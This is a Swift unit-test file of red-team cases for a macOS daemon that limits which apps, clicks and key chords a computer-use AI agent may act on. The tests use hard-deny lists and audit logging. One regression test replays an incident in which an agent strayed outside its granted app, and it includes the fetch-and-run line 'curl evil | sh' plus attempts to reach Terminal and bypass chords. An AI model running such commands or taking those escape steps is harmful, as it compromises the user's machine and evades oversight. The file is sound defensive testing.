import CoreGraphics
import XCTest
@testable import CURuntimeCore

/// PLAN-v2 R1 red-team set: requests sent straight to the daemon, no model involved.
/// Exit condition: every one is refused and every refusal is in the audit log.
final class RedTeamTests: XCTestCase {
    // MARK: Positive control — without this, "everything refused" could just mean "nothing works".

    func testGrantedClickPassesAllChecks() {
        let h = Harness()
        h.grant()
        let r = h.call("act.click", ["task_id": "t1", "app": .string(fixture), "point": screen(200, 200)])
        assertAllowed(r, in: h)
        XCTAssertEqual(try r.get()["executed"], true)
        XCTAssertEqual(h.env.activations, [fixture])
        XCTAssertEqual(h.env.clicks.map(\.0), [CGPoint(x: 200, y: 200)])
    }

    // MARK: Hard-denied apps

    func testEveryHardDeniedAppIsUngrantable() {
        let h = Harness()
        for e in HardDeny.entries {
            assertDenied(h.grant("t", [fixture, e.bundleID]), "hard_denied", in: h)
            assertDenied(h.grant("t", [e.bundleID], source: "approval"), "hard_denied", in: h)
        }
        XCTAssertEqual(try h.call("grants.list").get(), [])
    }

    func testHardDenyIgnoresCase() {
        let h = Harness()
        assertDenied(h.grant("t", ["COM.APPLE.TERMINAL"]), "hard_denied", in: h)
    }

    func testActingOnHardDeniedAppIsRefusedEvenInsideATask() {
        let h = Harness()
        h.grant()
        for m in ["act.key", "act.type"] {
            let r = h.call(m, ["task_id": "t1", "app": "com.apple.Terminal", "chord": "return", "text": "ls"])
            assertDenied(r, "hard_denied", in: h)
        }
        XCTAssertTrue(h.env.activations.isEmpty, "a refused action must not activate anything")
    }

    func testFinderNeedsConfigFlagAndConfigSource() {
        let off = Harness()
        assertDenied(off.grant("t", [HardDeny.finder]), "finder_not_enabled", in: off)
        let on = Harness(config: PolicyConfig(allowFinder: true, configGrants: true))
        assertDenied(on.grant("t", [HardDeny.finder], source: "approval"), "finder_not_enabled", in: on)
        assertAllowed(on.grant("t", [HardDeny.finder]), in: on)
    }

    // MARK: Ungranted / expired / revoked

    func testUngrantedAppIsRefused() {
        let h = Harness()
        h.grant()
        h.env.activatable.insert(textEdit.lowercased())
        h.env.windows.insert(FakeWindow(CGRect(x: 0, y: 0, width: 50, height: 50), textEdit.lowercased()), at: 0)
        assertDenied(h.call("act.click", ["task_id": "t1", "app": .string(textEdit), "point": screen(10, 10)]),
                     "not_granted", in: h)
        assertDenied(h.call("observe", ["task_id": "other"]), "no_grant", in: h)
    }

    // MARK: Apps named by display name (R4: every not_granted was the model writing "DSHFixture")

    func testDisplayNameResolvesToTheOnlyGrantedMatch() {
        let h = Harness()
        h.grant()
        h.env.names[fixture] = ["DSHFixture"]
        for name in ["DSHFixture", "  dshfixture "] {
            let r = h.call("act.click", ["task_id": "t1", "app": .string(name), "point": screen(200, 200)])
            assertAllowed(r, in: h)
            XCTAssertEqual(h.lastAudit["app"]?.stringValue, fixture)
            XCTAssertEqual(h.lastAudit["app_resolved_from_name"], true)
            XCTAssertEqual(h.lastAudit["app_name"]?.stringValue, name)
        }
        XCTAssertEqual(h.env.activations, [fixture, fixture])
        // A bundle ID is used as is: no name lookup.
        h.env.nameQueries = []
        assertAllowed(h.call("act.click", ["task_id": "t1", "app": .string(fixture), "point": screen(200, 200)]), in: h)
        XCTAssertEqual(h.env.nameQueries, [])
        XCTAssertNil(h.lastAudit["app_resolved_from_name"])
    }

    func testNamesOfUngrantedOrHardDeniedAppsAreNeverLookedUp() {
        let h = Harness()
        h.grant()
        h.env.names[fixture] = ["DSHFixture"]
        h.env.names[textEdit.lowercased()] = ["TextEdit"]
        h.env.names["com.apple.terminal"] = ["Terminal"]
        h.env.activatable.insert(textEdit.lowercased())
        assertDenied(h.call("act.click", ["task_id": "t1", "app": "TextEdit", "point": screen(10, 10)]), "not_granted", in: h)
        assertDenied(h.call("act.key", ["task_id": "t1", "app": "Terminal", "chord": "return"]), "not_granted", in: h)
        XCTAssertEqual(Set(h.env.nameQueries), [fixture], "only granted apps' names may be consulted")
        XCTAssertTrue(h.env.activations.isEmpty)
    }

    func testAmbiguousDisplayNameIsRefused() {
        let h = Harness()
        let other = "dev.dsh.bench.other"
        h.grant("t1", [fixture, other])
        h.env.names[fixture] = ["Notes"]
        h.env.names[other] = ["notes"]
        let r = h.call("act.click", ["task_id": "t1", "app": "Notes", "point": screen(200, 200)])
        assertDenied(r, "app_name_ambiguous", in: h)
        XCTAssertEqual(h.lastAudit["app_name"]?.stringValue, "Notes")
        XCTAssertTrue(h.env.activations.isEmpty)
        guard case .failure(let f) = r else { return }
        XCTAssertEqual(f.data?["retry"]?.stringValue, "never")
    }

    func testDisplayNameWithoutAGrantIsNotResolved() {
        let h = Harness()
        h.env.names[fixture] = ["DSHFixture"]
        assertDenied(h.call("act.key", ["task_id": "t1", "app": "DSHFixture", "chord": "return"]), "no_grant", in: h)
        XCTAssertEqual(h.env.nameQueries, [])
    }

    func testExpiredAndRevokedGrantsStopWorking() {
        let h = Harness()
        h.grant(ttl: 60)
        h.clock += 61
        assertDenied(h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": "return"]), "grant_expired", in: h)
        h.grant()
        h.call("grants.revoke", ["task_id": "t1"])
        assertDenied(h.call("observe", ["task_id": "t1"]), "no_grant", in: h)
    }

    func testGrantTTLIsCapped() throws {
        let h = Harness()
        let g = try h.grant(ttl: 10 * 24 * 3600).get()
        guard case .number(let exp) = g["expires_at"] else { return XCTFail() }
        XCTAssertEqual(exp, h.clock.timeIntervalSince1970 + GrantRules.maxTTL)
    }

    // MARK: Coordinates

    func testUndeclaredUnknownAndImageSpacesAreRefused() {
        let h = Harness()
        h.grant()
        let base: [String: JSONValue] = ["task_id": "t1", "app": .string(fixture)]
        var p = base
        p["point"] = ["x": 200, "y": 200]
        assertDenied(h.call("act.click", .object(p)), "undeclared_coordinate_space", in: h)
        p["point"] = ["x": 200, "y": 200, "space": "pixels"]
        assertDenied(h.call("act.click", .object(p)), "unknown_coordinate_space", in: h)
        p["point"] = ["x": 200, "y": 200, "space": "image"]
        assertDenied(h.call("act.click", .object(p)), "no_image_mapping", in: h)
        var d = base
        d["from"] = ["point": screen(200, 200)]
        d["to"] = ["point": ["x": 300, "y": 300]]
        assertDenied(h.call("act.drag", .object(d)), "undeclared_coordinate_space", in: h)
    }

    func testPointOnOccludingWindowIsRefused() {
        let h = Harness()
        h.grant()
        // TextEdit sits on top of part of the fixture window.
        h.env.windows.insert(FakeWindow(CGRect(x: 150, y: 150, width: 100, height: 100), textEdit.lowercased()), at: 0)
        assertDenied(h.call("act.click", ["task_id": "t1", "app": .string(fixture), "point": screen(200, 200)]),
                     "not_on_target_window", in: h)
        XCTAssertTrue(h.env.clicks.isEmpty)
        // Same window, unoccluded spot: allowed.
        assertAllowed(h.call("act.click", ["task_id": "t1", "app": .string(fixture), "point": screen(700, 600)]), in: h)
    }

    func testPointOutsideAnyTargetWindowIsRefused() {
        let h = Harness()
        h.grant()
        h.env.windows.insert(FakeWindow(CGRect(x: 0, y: 0, width: 1440, height: 24), "pid:431"), at: 0)  // menu bar
        assertDenied(h.call("act.click", ["task_id": "t1", "app": .string(fixture), "point": screen(20, 10)]),
                     "not_on_target_window", in: h)
        assertDenied(h.call("act.scroll", ["task_id": "t1", "app": .string(fixture), "point": screen(1300, 850),
                                           "direction": "down"]), "not_on_target_window", in: h)
    }

    func testDragEndpointOutsideTargetIsRefused() {
        let h = Harness()
        h.grant()
        assertDenied(h.call("act.drag", ["task_id": "t1", "app": .string(fixture),
                                         "from": ["point": screen(200, 200)], "to": ["point": screen(1200, 50)]]),
                     "not_on_target_window", in: h)
    }

    func testTargetThatCannotBecomeFrontmostIsRefused() {
        let h = Harness()
        h.grant()
        h.env.activatable = []
        assertDenied(h.call("act.type", ["task_id": "t1", "app": .string(fixture), "text": "hi"]), "activation_failed", in: h)
    }

    func testElementIDsWithoutSnapshotAreRefused() {
        let h = Harness()
        h.grant()
        assertDenied(h.call("act.click", ["task_id": "t1", "app": .string(fixture), "element_id": "a3"]), "unknown_element", in: h)
        assertDenied(h.call("act.set_value", ["task_id": "t1", "app": .string(fixture), "element_id": "a3", "value": "x"]),
                     "unknown_element", in: h)
        assertDenied(h.call("act.ax_action", ["task_id": "t1", "app": .string(fixture), "element_id": "o1", "action": "AXPress"]),
                     "unknown_element", in: h)
    }

    // MARK: System key chords

    func testEveryLegacyBlockedChordIsRefusedByTheAllowlist() {
        let h = Harness()
        h.grant()
        for chord in legacyBlockedChords {
            assertDenied(h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": .string(chord)]),
                         "chord_not_allowed", in: h)
        }
        XCTAssertTrue(h.env.activations.isEmpty, "a refused chord must not activate anything")
    }

    func testAllowlistBoundaries() {
        let h = Harness()
        h.grant()
        func key(_ c: String) -> Result<JSONValue, RPCFailure> {
            h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": .string(c)])
        }
        // Third-party global hotkeys, chords that touch other apps, F-keys in any form.
        for c in ["ctrl+cmd+a", "cmd+shift+a", "opt+a", "opt+space", "cmd+opt+h", "cmd+h", "cmd+m", "cmd+comma",
                  "cmd+shift+d", "opt+shift+a", "ctrl+shift+left", "ctrl+a", "cmd+r", "f11", "shift+f11", "f1", "cmd+f", "f20"] where c != "cmd+f" {
            assertDenied(key(c), "chord_not_allowed", in: h)
        }
        for c in ["a", "shift+a", "7", "shift+7", "return", "shift+return", "tab", "shift+tab", "escape", "space",
                  "up", "down", "left", "right", "delete", "forwarddelete", "home", "end", "pageup", "pagedown", "slash"] {
            assertAllowed(key(c), in: h)
        }
        for c in ChordPolicy.allowedWithModifiers { assertAllowed(key(c.description), in: h) }
    }

    func testChordAliasesCannotSneakPast() {
        let h = Harness()
        h.grant()
        for chord in ["Command+Space", "super+space", "space+cmd", "COMMAND + TAB", "alt+cmd+esc", "control+command+q"] {
            assertDenied(h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": .string(chord)]), "chord_not_allowed", in: h)
        }
        for chord in ["cmd+power", "cmd+eject", "cmd+a+b", "cmd", ""] {
            assertDenied(h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": .string(chord)]), "invalid_chord", in: h)
        }
        assertAllowed(h.call("act.key", ["task_id": "t1", "app": .string(fixture), "chord": "cmd+a"]), in: h)
    }

    // MARK: A hard-denied app in front halts everything (e.g. a link in the target launched a terminal)

    func testHardDeniedFrontmostHaltsEveryAction() {
        let h = Harness()
        h.grant()
        h.env.frontmost = "com.apple.terminal"
        let t: JSONValue = "t1", app: JSONValue = .string(fixture)
        let calls: [(String, JSONValue)] = [
            ("act.click", ["task_id": t, "app": app, "point": screen(200, 200)]),
            ("act.scroll", ["task_id": t, "app": app, "point": screen(200, 200), "direction": "down"]),
            ("act.drag", ["task_id": t, "app": app, "from": ["point": screen(200, 200)], "to": ["point": screen(300, 300)]]),
            ("act.type", ["task_id": t, "app": app, "text": "hello"]),
            ("act.key", ["task_id": t, "app": app, "chord": "return"]),
        ]
        for (m, p) in calls { assertDenied(h.call(m, p), "hard_denied_frontmost", in: h) }
        XCTAssertTrue(h.env.activations.isEmpty, "must not pull the target back over the escaped app")
        XCTAssertEqual(h.env.frontmost, "com.apple.terminal")
        // Once the terminal is gone, the same action proceeds.
        h.env.frontmost = "com.apple.finder"
        assertAllowed(h.call("act.key", ["task_id": t, "app": app, "chord": "return"]), in: h)
    }

    func testVendorPrefixIsHardDenied() {
        let h = Harness()
        for id in ["com.jetbrains.pycharm", "COM.JETBRAINS.toolbox", "dev.zed.Zed", "dev.zed.Zed-Preview",
                   "dev.zed.Zed-Nightly", "com.mitchellh.ghostty", "com.mitchellh.ghostty.debug",
                   "com.sublimetext.3", "com.sublimetext.4"] {
            assertDenied(h.grant("t", [id]), "hard_denied", in: h)
        }
        assertAllowed(h.grant("t", ["dev.dsh.bench.fixture"]), in: h)
    }

    /// Namespaces match whole segments only: a shared string prefix is not the same vendor.
    func testNamespaceMatchingIsSegmentWise() {
        let h = Harness()
        for id in ["com.jetbrainsfoo.app", "com.jetbrains-fan.viewer", "com.mitchellh.ghosttyx", "com.sublimetextish.app",
                   "dev.zed.Zedfoo", "dev.zed.Zedx.app"] {
            assertAllowed(h.grant("t", [id]), in: h)
        }
        for id in ["com.jetbrains", "com.jetbrains.intellij.ce", "com.mitchellh.ghostty.debug", "dev.zed.Zed-Dev"] {
            assertDenied(h.grant("t", [id]), "hard_denied", in: h)
        }
    }

    // MARK: Requests for more access (headless: nobody approves)

    func testGrantRequestNeverWidensAGrant() {
        let h = Harness()
        h.grant()
        let r = h.call("grants.request", ["task_id": "t1", "bundle_id": .string(textEdit), "reason": "need it"])
        XCTAssertEqual(try r.get()["status"], "needs_approval")
        XCTAssertEqual(h.lastAudit["decision"], "defer")
        assertDenied(h.call("act.key", ["task_id": "t1", "app": .string(textEdit), "chord": "return"]), "not_granted", in: h)
        assertDenied(h.call("grants.request", ["task_id": "t1", "bundle_id": "com.apple.Terminal"]), "hard_denied", in: h)
    }

    func testLaunchNeedsAllowLaunch() {
        let h = Harness()
        h.grant()
        assertDenied(h.call("apps.launch", ["task_id": "t1", "bundle_id": .string(fixture)]), "launch_not_allowed", in: h)
        assertDenied(h.call("apps.launch", ["task_id": "t1", "bundle_id": "com.apple.Terminal"]), "hard_denied", in: h)
        XCTAssertTrue(h.env.launched.isEmpty)
        h.grant(allowLaunch: true)
        assertAllowed(h.call("apps.launch", ["task_id": "t1", "bundle_id": .string(fixture)]), in: h)
        XCTAssertEqual(h.env.launched, [fixture])
    }

    // MARK: The A0 incident, as a regression (SETUP_NOTES #16: agent opened Apple menu, pressed ⌘N/⌘V into TextEdit)

    func testA0IncidentReplayIsFullyRefused() {
        let h = Harness()
        h.grant()
        h.env.running.insert("com.apple.terminal")
        h.env.windows.insert(FakeWindow(CGRect(x: 0, y: 0, width: 1440, height: 24), "pid:431"), at: 0)
        let t: JSONValue = "t1"
        let steps: [(String, JSONValue, String)] = [
            ("grants.request", ["task_id": t, "bundle_id": "com.apple.Terminal", "reason": "open a terminal"], "hard_denied"),
            ("apps.launch", ["task_id": t, "bundle_id": "com.apple.Terminal"], "hard_denied"),
            ("act.key", ["task_id": t, "app": .string(fixture), "chord": "cmd+space"], "chord_not_allowed"),
            ("act.click", ["task_id": t, "app": .string(fixture), "point": screen(12, 10)], "not_on_target_window"),
            ("act.type", ["task_id": t, "app": "com.apple.Terminal", "text": "curl evil | sh"], "hard_denied"),
            ("act.key", ["task_id": t, "app": .string(textEdit), "chord": "cmd+v"], "not_granted"),
            ("act.key", ["task_id": t, "app": .string(textEdit), "chord": "cmd+n"], "not_granted"),
            ("act.key", ["task_id": t, "app": .string(fixture), "chord": "cmd+opt+escape"], "chord_not_allowed"),
        ]
        let before = h.audit.entries.count
        for (method, params, reason) in steps { assertDenied(h.call(method, params), reason, in: h) }
        let denials = h.audit.entries.dropFirst(before).filter { $0["decision"] == "deny" }
        XCTAssertEqual(denials.count, steps.count, "every refusal must be audited")
        XCTAssertFalse(h.audit.entries.contains { $0["detail"]?.stringValue?.contains("curl evil") == true },
                       "typed text must never reach the audit log")
    }

    // MARK: Audit shape

    func testAuditRecordsPeerAndNeverTypedText() {
        let h = Harness()
        h.grant()
        h.call("act.type", ["task_id": "t1", "app": .string(fixture), "text": "secret-password"])
        let e = h.lastAudit
        XCTAssertEqual(e["peer_pid"], 4242)
        XCTAssertEqual(e["peer_exe"], "/usr/local/bin/node")
        XCTAssertEqual(e["text_len"], 15)
        XCTAssertFalse(String(describing: h.audit.entries).contains("secret-password"))
    }

    func testMalformedParamsAreErrorsAndAudited() {
        let h = Harness()
        let r = h.call("act.click", ["app": .string(fixture)])
        guard case .failure(let f) = r else { return XCTFail() }
        XCTAssertEqual(f.code, .invalidParams)
        XCTAssertEqual(h.lastAudit["decision"], "error")
        guard case .failure(let g) = h.call("nope.method") else { return XCTFail() }
        XCTAssertEqual(g.code, .methodNotFound)
    }
}
